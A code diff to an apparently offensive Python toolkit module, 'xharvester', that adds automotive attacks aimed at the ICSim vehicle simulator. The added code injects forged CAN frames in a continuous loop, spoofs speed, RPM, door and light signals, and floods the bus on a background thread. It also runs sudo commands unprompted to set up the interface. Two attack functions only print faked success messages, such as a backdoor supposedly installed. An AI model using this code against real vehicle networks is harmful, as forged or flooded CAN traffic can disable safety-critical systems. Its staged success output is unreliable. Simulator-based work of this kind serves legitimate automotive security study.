@@ -2,6 +2,9 @@
 import os
 import time
 import socket
+import random
+import can
+import threading
 
 # Color codes
 GREEN = '\033[32m'
@@ -19,21 +22,11 @@ ANIMATION_SPEED = 0.005
 
 class AutomobileModule:
     def __init__(self):
-        #self.socket = socket.gethostname()
-        pass
-
-    ### Color Status ###
-    def print_status(message: str) -> None:
-        """Print status messages"""
-        print(f"{GREEN}[✚]{RESET} {message}")
-
-    def print_warning(message: str) -> None:
-        """Print warning messages"""
-        print(f"{YELLOW}[❕️]{RESET} {message}")
-
-    def print_error(message: str) -> None:
-        """Print error messages"""
-        print(f"{RED}[━]{RESET} {message}")
+        self.can_interface = "vcan0"  # Default virtual CAN interface for ICSim
+        self.bus = None
+        self.simulation_active = False
+        self.hostname = self.get_hostname()
+        self.setup_can_interface()  # Initialize CAN interface on startup    
 
     ### Text Animation ###
     def text_animation(self):
@@ -52,7 +45,6 @@ class AutomobileModule:
         print(f"\t\t{YELLOW}ℬ y{GREEN} 𝓝𝓮𝓽𝔀𝓸𝓻𝓴({RED}G{YELLOW}H{GREEN}A{BLACK}N{RED}A)\t\t\t")
         print(f"{RED} Use only for authorized security testing!{RESET}")
 
-
     def clear_screen(self) -> None:
         os.system('cls' if os.name == 'nt' else 'clear')
 
@@ -61,13 +53,401 @@ class AutomobileModule:
             return socket.gethostname()
         except:
             return "unknown"
-        
-    def discover_classic_devices(self) -> None:
-        pass
 
-    def list_services(self, address) -> None:
-        pass
+    ### CAN Bus Operations ###
+    def setup_can_interface(self):
+        """Set up CAN interface for simulation"""
+        try:
+            # Check if virtual CAN interface is available
+            if os.system(f"ip link show {self.can_interface} > /dev/null 2>&1") != 0:
+                print(f"\n{YELLOW}  CAN interface {self.can_interface} not found ❕️")
+                time.sleep(1)
+                print(f"{GREEN}  Creating virtual CAN interface for ICSim...")
+                time.sleep(3)
+                os.system(f"sudo modprobe vcan && sudo ip link add dev {self.can_interface} type vcan && sudo ip link set up {self.can_interface}")
+            
+            # Initialize CAN bus
+            self.bus = can.interface.Bus(channel=self.can_interface, bustype='socketcan')            
+            print(f"\n{GREEN}  Connected to CAN interface:{YELLOW} {self.can_interface}")
+            time.sleep(3)
+            return True
+        except Exception as e:
+            print(f"{RED}  Failed to setup CAN interface: {e}")
+            print(f"{YELLOW}  Some features may not work without a proper CAN interface ❕️")
+            return False
+
+    def can_message_injection(self):
+        """Simulate CAN message injection attack with ICSim-specific IDs"""
+        print(f"{GREEN}  Starting CAN Message Injection simulation for ICSim")
+        
+        if not self.bus:
+            if not self.setup_can_interface():
+                print(f"{YELLOW}  Running in demo mode without actual CAN interface")
+        
+        # ICSim-specific CAN IDs
+        can_ids = {
+            "Speed": 0x244,
+            "RPM": 0x201,
+            "Turn Signals": 0x2C0,
+            "Doors": 0x19B,
+            "Lights": 0x2E0
+        }
+        
+        print(f"\n{YELLOW}  Available target systems for ICSim:{RESET}")
+        for i, (system, can_id) in enumerate(can_ids.items()):
+            print(f"{GREEN}  [{i}] {YELLOW}{system} {GREEN}({CYAN}ID: 0x{can_id:03X}{GREEN})")
+        
+        try:
+            choice = int(input(f"\n{GREEN}  Select target system: {YELLOW}"))
+            system = list(can_ids.keys())[choice]
+            can_id = can_ids[system]
+            
+            # Create appropriate malicious data based on the system
+            if system == "Speed":
+                speed = int(input(f"{GREEN}  Enter speed value (0-255): {YELLOW}"))
+                malicious_data = [0, 0, 0, speed, 150]
+            elif system == "RPM":
+                rpm = int(input(f"{GREEN}  Enter RPM value (0-65535): {YELLOW}"))
+                malicious_data = [rpm >> 8, rpm & 0xFF, 0, 0, 0, 0, 0, 0]
+            elif system == "Turn Signals":
+                malicious_data = [random.randint(0, 3), 0, 0, 0, 0, 0, 0, 0]
+            else:
+                malicious_data = [random.randint(0, 255) for _ in range(8)]
+            
+            message = can.Message(arbitration_id=can_id, data=malicious_data, is_extended_id=False)
+            
+            if self.bus:
+                active = True
+                try:
+                    while active:
+                        time.sleep(0.005)
+                        self.bus.send(message)
+                        print(f"{GREEN}  Injected malicious CAN message to {system} (ID: 0x{can_id:03X})")
+                        print(f"{BLUE}  Data:{YELLOW} {[hex(x) for x in malicious_data]}")
+                except Exception:
+                    active = False        
+            else:
+                print(f"{YELLOW}  Would inject: {system} - ID: 0x{can_id:03X}, Data: {malicious_data}")
+                
+        except (ValueError, IndexError):
+            print(f"{RED}  Invalid selection")
+        except Exception as e:
+            print(f"{RED}  Injection failed: {e}")
+
+    def ecu_firmware_attack(self):
+        """Simulate ECU firmware attack"""
+        print(f"{GREEN}  Starting ECU Firmware Attack...")
+        
+        # Simulate firmware extraction and modification
+        print(f"{YELLOW}  Extracting current ECU firmware...")
+        time.sleep(3)
+        
+        print(f"{YELLOW}  Analyzing firmware for vulnerabilities...")
+        time.sleep(3)
+        
+        print(f"{RED}  Modifying firmware with malicious code...")
+        time.sleep(3)
+        
+        print(f"{RED}  Flashing modified firmware back to ECU...")
+        time.sleep(3)
+        
+        print(f"{GREEN}  ECU firmware compromised! Backdoor installed.")
+        print(f"{RED}  Vehicle may behave unpredictably or be remotely controlled")
+
+    def wireless_gateway_exploit(self):
+        """Wireless gateway exploit"""
+        print(f"{GREEN}  Starting Wireless Gateway Exploit simulation")
+        
+        # Common automotive wireless attack vectors
+        attack_vectors = [
+            f"Bluetooth {GREEN}({CYAN}Keyless Entry{GREEN})",
+            f"Wi-Fi {GREEN}({CYAN}Infotainment System{GREEN})",
+            f"Cellular {GREEN}({CYAN}Telematics{GREEN})",
+            f"TPMS {GREEN}({CYAN}Tire Pressure Monitoring System{GREEN})",
+            f"RFID {GREEN}({CYAN}Immobilizer Bypass{GREEN})"
+        ]
+        
+        print(f"\n{YELLOW}  Available attack vectors")
+        for i, vector in enumerate(attack_vectors):
+            print(f"{GREEN}  [{i}]{YELLOW} {vector}")
+        
+        try:
+            choice = int(input(f"\n{GREEN}  Select attack vector:{YELLOW} "))
+            vector = attack_vectors[choice]
+            
+            print(f"{BLUE}  Scanning for {vector} vulnerabilities...")
+            time.sleep(2)
+            
+            print(f"{YELLOW}  Exploiting {vector} weakness...")
+            time.sleep(2)
+            
+            print(f"{GREEN}  Successfully compromised {vector}!")
+            print(f"{GREEN}  Gained access to vehicle internal network")
+            
+        except (ValueError, IndexError):
+            print(f"{RED}  Invalid selection")
+
+    def sensor_spoofing(self):
+        """Simulate sensor spoofing attack with vehicle integration"""
+        print(f"{MAGENTA}  [+]{GREEN} Starting Sensor Spoofing for ICSim")
     
+        # Dictionary mapping sensor names to their CAN ID and a spoofing function
+        sensors = {
+            "Speed Sensor": {
+                "id": 0x244,
+                "spoof_func": self._spoof_speed
+            },
+            "RPM Sensor": {
+                "id": 0x201,
+                "spoof_func": self._spoof_rpm
+            },
+            "Turn Signal Sensor": {
+                "id": 0x2C0,
+                "spoof_func": self._spoof_turn_signal
+            },
+            "Door Sensor": {
+                "id": 0x19B,
+                "spoof_func": self._spoof_doors
+            },
+            "Light Sensor": {
+                "id": 0x2E0,
+                "spoof_func": self._spoof_lights
+            }
+        }
+        
+        print(f"\n{YELLOW}   Available sensors to spoof for ICSim")
+        sensor_list = list(sensors.keys())
+        for i, sensor in enumerate(sensor_list):
+            print(f"  {GREEN}[{i}] {YELLOW}{sensor} {GREEN}({CYAN}ID: 0x{sensors[sensor]['id']:03X}{GREEN})")
+    
+        try:
+            choice = int(input(f"\n{GREEN}  Select sensor to spoof: {YELLOW}"))
+            sensor_name = sensor_list[choice]
+            sensor_info = sensors[sensor_name]
+            
+            can_id = sensor_info['id']
+            
+            print(f"\n{BLUE}  Intercepting {sensor_name} data...")
+            time.sleep(1)
+    
+            # Call the specific spoofing function for this sensor
+            spoofed_data = sensor_info['spoof_func']()
+            
+            if spoofed_data is None:
+                print(f"{YELLOW}  Spoofing cancelled or failed.")
+                return
+    
+            print(f"\n{BLUE}  Generating spoofed {sensor_name} values...")
+            time.sleep(1)
+    
+            # Send the spoofed data
+            if self.bus:
+                message = can.Message(arbitration_id=can_id, data=spoofed_data, is_extended_id=False)
+                self.bus.send(message)
+                print(f"{GREEN}  Injecting false {sensor_name} data...")
+                print(f"{BLUE}  CAN ID: 0x{can_id:03X}, Data: {[hex(x) for x in spoofed_data]}")
+            else:
+                print(f"{BLUE}  Would inject: {sensor_name} - ID: 0x{can_id:03X}, Data: {spoofed_data}")
+            
+            time.sleep(1)
+            print(f"{GREEN}  {sensor_name} spoofing successful!")
+            print(f"{YELLOW}  ICSim dashboard should now show the spoofed value.")
+    
+        except (ValueError, IndexError):
+            print(f"{RED}  Invalid selection")
+        except Exception as e:
+            print(f"{RED}  Spoofing failed: {e}")
+    
+    # --- NEW HELPER FUNCTIONS FOR EACH SENSOR TYPE ---
+    
+    def _spoof_speed(self):
+        """Spoof the vehicle speed sensor (ICSim ID 0x244)"""
+        try:
+            speed = int(input(f"{GREEN}  Enter speed value (0-255 km/h): {YELLOW}"))
+            speed = max(0, min(255, speed))  # Clamp value
+            # ICSim expects the speed in the first data byte
+            return [0x00, 0x00, 0x00, speed, 150]
+        except ValueError:
+            print(f"\n{RED}  Invalid speed value")
+            return None
+    
+    def _spoof_rpm(self):
+        """Spoof the engine RPM sensor (ICSim ID 0x201)"""
+        try:
+            rpm = int(input(f"{GREEN}  Enter RPM value (0-8000): {YELLOW}"))
+            rpm = max(0, min(8000, rpm))  # Clamp value
+            # ICSim expects RPM as a 16-bit value across first two bytes
+            byte1 = (rpm >> 8) & 0xFF  # High byte
+            byte2 = rpm & 0xFF         # Low byte
+            return [byte1, byte2, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]
+        except ValueError:
+            print(f"\n{RED}  Invalid RPM value")
+            return None
+    
+    def _spoof_turn_signal(self):
+        """Spoof the turn signal sensor (ICSim ID 0x2C0)"""
+        print(f"{GREEN}  Select turn signal state")
+        print(f"  {GREEN}[0]{MAGENTA} Off")
+        print(f"  {GREEN}[1]{MAGENTA} Left")
+        print(f"  {GREEN}[2]{MAGENTA} Right")
+        print(f"  {GREEN}[3]{MAGENTA} Hazard (Both)")
+        
+        try:
+            choice = int(input(f"{GREEN}  Selection: {YELLOW}"))
+            states = {0: 0x00, 1: 0x01, 2: 0x02, 3: 0x03}
+            state_byte = states.get(choice, 0x00)
+            # The turn signal state is typically in the first byte
+            return [state_byte, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]
+        except ValueError:
+            print(f"\n{RED}  Invalid selection")
+            return None
+    
+    def _spoof_doors(self):
+        """Spoof the door lock sensor (ICSim ID 0x19B)"""
+        print(f"{GREEN}  Select door state")
+        print(f"{GREEN}  [0]{MAGENTA} Locked")
+        print(f"{GREEN}  [1]{MAGENTA} Unlocked")
+        
+        try:
+            choice = int(input(f"{GREEN}  Selection: {YELLOW}"))
+            state_byte = 0x0F if choice == 0 else 0x00
+            return [0x00, 0x00, state_byte, 0x00, 0x00, 0x00]
+        except ValueError:
+            print(f"\n{RED}  [!] Invalid selection")
+            return None
+    
+    def _spoof_lights(self):
+        """Spoof the light sensor (ICSim ID 0x2E0)"""
+        print(f"{GREEN}  Select light state")
+        print(f"{GREEN}  [0] {MAGENTA}Off")
+        print(f"{GREEN}  [1] {MAGENTA}On")
+        
+        try:
+            choice = int(input(f"{GREEN}  Selection:{YELLOW} "))
+            state_byte = 0x01 if choice == 1 else 0x00
+            return [state_byte, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]
+        except ValueError:
+            print(f"\n{RED}  [!] Invalid selection")
+            return None
+        
+
+    def can_bus_flood(self):
+        """Simulate CAN bus flooding attack with vehicle-specific IDs"""
+        print(f"{GREEN}  [+] Starting CAN Bus Flood")
+        
+        if not self.bus:
+            if not self.setup_can_interface():
+                print(f"{YELLOW}  Running in demo mode without actual CAN interface")
+        
+        try:
+            duration = int(input(f"{GREEN}  Flood duration ({YELLOW}seconds{GREEN}) [{YELLOW}default: 5{YELLOW}{GREEN}]: {YELLOW}") or "5")
+            priority = input(f"{GREEN}  Message priority [high/medium/low, default: high]: {YELLOW}") or "high"
+            
+            print(f"\n{RED}  [ℹ]{CYAN} Flooding CAN bus with {priority} priority messages for {duration} seconds...")
+            
+            # Determine message rate based on priority
+            rates = {"high": 1000, "medium": 100, "low": 10}
+            rate = rates.get(priority.lower(), 100)
+            
+            # vehicle-specific CAN IDs to target
+            icsim_ids = [0x244, 0x201, 0x2C0, 0x2D0, 0x2E0, 0x19B]
+            
+            # Start flooding simulation
+            self.simulation_active = True
+            start_time = time.time()
+            
+            def flood_messages():
+                msg_count = 0
+                while self.simulation_active and (time.time() - start_time) < duration:
+                    if self.bus:
+                        # Send random CAN messages targeting vehicle IDs
+                        can_id = random.choice(icsim_ids)
+                        data = [random.randint(0, 255) for _ in range(random.randint(1, 8))]
+                        message = can.Message(arbitration_id=can_id, data=data, is_extended_id=False)
+                        try:
+                            self.bus.send(message)
+                        except can.CanError:
+                            print(f"{RED}  CAN bus error - flooding may be too intense")
+                            break
+                    msg_count += 1
+                    time.sleep(1/rate)
+                
+                return msg_count
+            
+            # Run flooding in a separate thread
+            flood_thread = threading.Thread(target=flood_messages)
+            flood_thread.start()
+            
+            # Show progress
+            for i in range(duration):
+                if not self.simulation_active:
+                    break
+                print(f"{YELLOW}  Flooding... {i+1}/{duration} seconds{RESET}", end="\r")
+                time.sleep(1)
+            
+            self.simulation_active = False
+            flood_thread.join()
+            
+            print(f"{GREEN}  [✚]{YELLOW} CAN bus flood completed!")
+            print(f"{YELLOW}  Vehicle may become unresponsive or display erratic behavior ❕️")
+            
+        except ValueError:
+            print(f"{RED}  [━] Invalid input")
+        except Exception as e:
+            print(f"{RED}  Flooding failed: {e}")
+            self.simulation_active = False
+
+    def real_time_monitor(self):
+        """Real-time CAN bus monitoring for vehicle"""
+        print(f"\n{GREEN}  [+] Starting Real-time CAN Bus Monitoring for vehicle")
+        
+        if not self.bus:
+            if not self.setup_can_interface():
+                print(f"\n{RED}  [-] Cannot monitor without CAN interface")
+                return
+        
+        try:
+            duration = int(input(f"{GREEN}  Monitoring duration ({YELLOW}seconds{GREEN}) [{YELLOW}0{GREEN} for continuous]:{YELLOW} ") or "0")
+            filter_ids = input(f"{GREEN}  Filter by CAN IDs [{YELLOW}0x244/0x19B{YELLOW}]{GREEN} ({YELLOW}comma-separated, leave empty for all{GREEN}):{YELLOW} ")
+            
+            # Parse filter IDs
+            filter_list = []
+            if filter_ids:
+                try:
+                    filter_list = [int(id_str.strip(), 16) if id_str.strip().startswith('0x') 
+                                  else int(id_str.strip()) for id_str in filter_ids.split(',')]
+                except ValueError:
+                    print(f"  [━] Invalid CAN ID format")
+                    return
+            
+            print(f"{RED}  [ℹ] Starting monitor... Press Ctrl+C to stop")
+            print(f"{CYAN}  Timestamp{f'{YELLOW}    |{CYAN}':6} CANID{f'{YELLOW} |{CYAN}':6}       Data")
+            print(f"  {YELLOW}{'-'*46}{RESET}")
+            
+            start_time = time.time()
+            message_count = 0
+            
+            # Set up a notifier to read messages
+            try:
+                while (duration == 0) or (time.time() - start_time < duration):
+                    time.sleep(0.08)
+                    message = self.bus.recv(timeout=0.3)
+                    if message:
+                        if not filter_list or message.arbitration_id in filter_list:
+                            message_count = message_count + 1
+                            timestamp = time.thread_time_ns()
+                            can_id = f"{message.arbitration_id:03X}"
+                            data_hex = ' '.join(f"{byte:02X}" for byte in message.data)
+                            print(f"{CYAN}  {timestamp}{f'{YELLOW}     |  {CYAN}':6}{can_id}{f'{YELLOW}  | {CYAN}':10}{data_hex}")
+            except KeyboardInterrupt as err:
+                print(f"{RED}{err}Monitoring stopped by user")
+            
+            print(f"{GREEN}  [✚] Monitoring completed. Captured {YELLOW}{message_count}{GREEN} messages.")
+            
+        except Exception as e:
+            print(f"{RED}  Monitoring failed: {e}")
+
+    ### Main Menu ###
     def main(self) -> None:
         time.sleep(0.05)
         active = True
@@ -83,62 +463,72 @@ class AutomobileModule:
             print(f"{GREEN}\t[3]{MAGENTA} 📶{CYAN} Wireless Gateway Exploit")
             print(f"{GREEN}\t[4]{MAGENTA} 📡{CYAN} Sensor Spoofing")
             print(f"{GREEN}\t[5]{MAGENTA} 🚫{CYAN} CAN Bus Flood")
+            print(f"{GREEN}\t[6]{MAGENTA} 👁️{CYAN}  Real-time CAN Monitor")
             print(f"{LIGHTCYAN_EX}  ⇇━━━━━━━━━━━━━━━━━━━━━━━━୨ৎ━━━━━━━━━━━━━━━━━━━━━━━━━⇉")
             print(f"{YELLOW}\t[0] 🚪🔙 Back")
             print(f"{LIGHTCYAN_EX}  ⇇━━━━━━━━━━━━━━━━━━━━━━━━୨ৎ━━━━━━━━━━━━━━━━━━━━━━━━━⇉")
 
             try:
-                choice = input(f"\n  [💀] {GREEN}xharvester{YELLOW}@{RESET}{CYAN}{self.get_hostname()}{RESET}{RED}:{RESET}{GREEN}~{RESET}{YELLOW}$ ")
+                choice = input(f"\n  [💀] {GREEN}xharvester{YELLOW}@{RESET}{CYAN}{self.hostname}{RESET}{RED}:{RESET}{GREEN}~{RESET}{YELLOW}$ ")
+                    
+                if choice == "0":
+                    mesg = f"{MAGENTA}\n\t\t\t🚪🔙{YELLOW} Moving Back・・・\n\n"
+                    for word in mesg:
+                        print(word, end="", flush=True)
+                        time.sleep(0.05)
+                    active = False
+
+                elif choice == "1":
+                    print(f"\n{GREEN}  CAN Message Injection:{CYAN} Attacker injects malicious commands onto the vehicle's internal network via OBD-II PORT.")
+                    print(f"{GREEN}  Impact:{CYAN} Can lead to unauthorized control of critical systems like brakes or steering.")
+                    print(f"{GREEN}  Protection:{CYAN} Implement message authentication (e.g., SecOC) and network segmentation.{RESET}")
+                    self.can_message_injection()
+
+                elif choice == "2":
+                    print(f"\n{GREEN}  ECU Firmware Attack:{CYAN} Flashing malicious software onto a vehicle's electronic control units.")
+                    print(f"{GREEN}  Impact:{CYAN} Permanently alters vehicle behavior, disables safety features, or bricks the ECU.")
+                    print(f"{GREEN}  Protection:{CYAN} Use secure boot processes and cryptographically signed firmware updates.{RESET}")
+                    self.ecu_firmware_attack()
+
+                elif choice == "3":
+                    print(f"\n{GREEN}  Wireless Gateway Exploit:{CYAN} Attacking via Bluetooth, Wi-Fi, or cellular to access internal networks.")
+                    print(f"{GREEN}  Impact:{CYAN} Provides a remote entry point to steal data or send commands to critical systems.")
+                    print(f"{GREEN}  Protection:{CYAN} Harden external interfaces, use firewalls, and employ secure protocols (TLS).{RESET}")
+                    self.wireless_gateway_exploit()
+
+                elif choice == "4":
+                    print(f"\n{GREEN}  Sensor Spoofing:{CYAN} Sending falsified data from spoofed sensors (e.g., GPS, wheel speed).")
+                    print(f"{GREEN}  Impact:{CYAN} Misleads autonomous systems, causing incorrect navigation or unsafe maneuvers.")
+                    print(f"{GREEN}  Protection:{CYAN} Implement sensor data validation and anomaly-based intrusion detection systems.{RESET}")
+                    self.sensor_spoofing()
+
+                elif choice == "5":
+                    print(f"\n{GREEN}  CAN Bus Flood:{CYAN} Flooding the network with high-priority messages to block communication.")
+                    print(f"{GREEN}  Impact:{CYAN} Renders safety-critical systems unresponsive, potentially immobilizing the vehicle.")
+                    print(f"{GREEN}  Protection:{CYAN} Deploy intrusion detection systems (IDS) to monitor for anomalous message rates.{RESET}")
+                    self.can_bus_flood()
+
+                elif choice == "6":
+                    print(f"\n{GREEN}  Real-time CAN Monitor:{CYAN} Monitor CAN bus traffic in real-time.")
+                    print(f"{GREEN}  Purpose:{CYAN} Observe normal vehicle communication and detect anomalies.")
+                    print(f"{GREEN}  Usage:{CYAN} Essential for understanding vehicle network behavior.{RESET}")
+                    self.real_time_monitor()
+
+                else:
+                    error = f"\n\t\t\t{YELLOW}{choice} is not a valid option!\n"
+                    for word in error:
+                        print(word, end="", flush=True)
+                        time.sleep(0.05)
+
+                if choice != "0":
+                    input(f"\n  {GREEN}Press Enter to continue・・・")
+            
             except (KeyboardInterrupt, EOFError):
-                terminator = f"\n\n\t\t\t{MAGENTA}[💀]{RESET}{RED} Exiting・・・\n\n"
+                terminator = f"\n\n\t\t\t{MAGENTA}🚪🔙{YELLOW} Moving Back・・・\n\n"
                 for word in terminator:
                     print(word, end="", flush=True)
                     time.sleep(0.05)
-                break
-                    
-            if choice == "0":
-                mesg = f"{MAGENTA}\n\t\t\t🚪🔙{YELLOW} Moving Back・・・\n\n"
-                for word in mesg:
-                    print(word, end="", flush=True)
-                    time.sleep(0.05)
                 active = False
-
-            elif choice == "1":
-                print(f"\n{GREEN}  CAN Message Injection:{CYAN} Attacker injects malicious commands onto the vehicle's internal network via OBD-11 PORT.")
-                print(f"{GREEN}  Impact:{CYAN} Can lead to unauthorized control of critical systems like brakes or steering.")
-                print(f"{GREEN}  Protection:{CYAN} Implement message authentication (e.g., SecOC) and network segmentation.{RESET}")
-
-            elif choice == "2":
-                print(f"\n{GREEN}  ECU Firmware Attack:{CYAN} Flashing malicious software onto a vehicle's electronic control units.")
-                print(f"{GREEN}  Impact:{CYAN} Permanently alters vehicle behavior, disables safety features, or bricks the ECU.")
-                print(f"{GREEN}  Protection:{CYAN} Use secure boot processes and cryptographically signed firmware updates.{RESET}")
-                
-            elif choice == "3":
-                print(f"\n{GREEN}  Wireless Gateway Exploit:{CYAN} Attacking via Bluetooth, Wi-Fi, or cellular to access internal networks.")
-                print(f"{GREEN}  Impact:{CYAN} Provides a remote entry point to steal data or send commands to critical systems.")
-                print(f"{GREEN}  Protection:{CYAN} Harden external interfaces, use firewalls, and employ secure protocols (TLS).{RESET}")
-                
-            elif choice == "4":
-                print(f"\n{GREEN}  Sensor Spoofing:{CYAN} Sending falsified data from spoofed sensors (e.g., GPS, wheel speed).")
-                print(f"{GREEN}  Impact:{CYAN} Misleads autonomous systems, causing incorrect navigation or unsafe maneuvers.")
-                print(f"{GREEN}  Protection:{CYAN} Implement sensor data validation and anomaly-based intrusion detection systems.{RESET}")
-
-            elif choice == "5":
-                print(f"\n{GREEN}  CAN Bus Flood:{CYAN} Flooding the network with high-priority messages to block communication.")
-                print(f"{GREEN}  Impact:{CYAN} Renders safety-critical systems unresponsive, potentially immobilizing the vehicle.")
-                print(f"{GREEN}  Protection:{CYAN} Deploy intrusion detection systems (IDS) to monitor for anomalous message rates.{RESET}")
-                
-
-
-
-            else:
-                error = f"\n\t\t\t{YELLOW}{choice} is not a valid option!\n"
-                for word in error:
-                    print(word, end="", flush=True)
-                    time.sleep(0.05)
-                
-            if choice != "0":
-                input(f"\n  {GREEN}Press Enter to continue・・・")
 
 if __name__ == "__main__":
     auto = AutomobileModule()
